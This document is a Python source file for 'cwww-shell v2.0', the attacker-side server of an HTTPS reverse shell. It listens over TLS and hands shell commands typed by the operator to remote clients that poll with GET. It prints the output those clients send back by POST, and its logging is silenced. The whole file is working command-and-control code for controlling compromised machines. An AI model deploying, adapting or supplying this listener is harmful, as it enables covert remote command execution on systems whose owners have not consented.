#!/usr/bin/env python3
import sys
import ssl
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

INTRO = """
Welcome to the cwww-shell v2.0 by Ivan Nikolskiy / enty8080

Introduction: Wait for your client to connect, examine it\'s output and then
              type in your commands to execute on client. You\'ll have to
              wait some time between commands. Use ";" for multiple commands.
              Trying to execute interactive commands may give you headache
              so beware. You also shouldn\'t try to view binary data too.
              "echo bla >> file", "cat >> file <<- EOF", sed etc. are your
              friends if you don\'t like using vi in a delayed line mode.
              To exit this program on any time without doing harm to either
              server or client just type "quit".
"""

def get_method(request):
    print(f'connect from {request.client_address[0]}:{str(request.client_address[1])}\n')

    command = input('$ ')
    if command == 'quit':
        body = b'quit\n'
        request.send_response(200)
        request.send_header("Content-Type", "text/plain; charset=utf-8")
        request.send_header("Content-Length", str(len(body)))
        request.send_header("Connection", "close")
        request.end_headers()
        request.wfile.write(body)
        request.server.shutdown()
        return

    body = command.encode("utf-8")
    request.send_response(200)
    request.send_header("Content-Type", "text/plain; charset=utf-8")
    request.send_header("Content-Length", str(len(body)))
    request.send_header("Connection", "close")
    request.end_headers()
    request.wfile.write(body)
    request.wfile.flush()
    print('sent.\n')

    print("\nWaiting for connect ... ", end='')

def post_method(request):
    print(f'connect from {request.client_address[0]}:{str(request.client_address[1])}\n')

    length = int(request.headers.get('Content-Length', '0'))
    data = request.rfile.read(length) if length > 0 else b""
    print(data.decode("utf-8", errors="replace"), end='')

    body = b"ok\n"
    request.send_response(200)
    request.send_header("Content-Type", "text/plain; charset=utf-8")
    request.send_header("Content-Length", str(len(body)))
    request.send_header("Connection", "close")
    request.end_headers()
    request.wfile.write(body)
    request.wfile.flush()

    print("\nWaiting for connect ... ", end='')

class Handler(BaseHTTPRequestHandler):
    methods = {}

    def log_message(self, fmt, *args):
        return

    def do_GET(self):
        fn = self.methods.get('get')
        if not fn:
            self.send_error(405)
            return
        fn(self)

    def do_POST(self):
        fn = self.methods.get('post')
        if not fn:
            self.send_error(405)
            return
        fn(self)

def main():
    if len(sys.argv) < 5:
        print(f'Usage {sys.argv[0]} <host> <port> <cert.crt> <key.key>')
        return

    host = sys.argv[1]
    port = int(sys.argv[2])
    cert_path = sys.argv[3]
    key_path = sys.argv[4]

    Handler.methods = {'get': get_method, 'post': post_method}

    httpd = ThreadingHTTPServer((host, port), Handler)

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.load_cert_chain(certfile=cert_path, keyfile=key_path)

    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)

    print(INTRO)
    print("\nWaiting for connect ... ", end='')

    httpd.serve_forever()

if __name__ == '__main__':
    main()
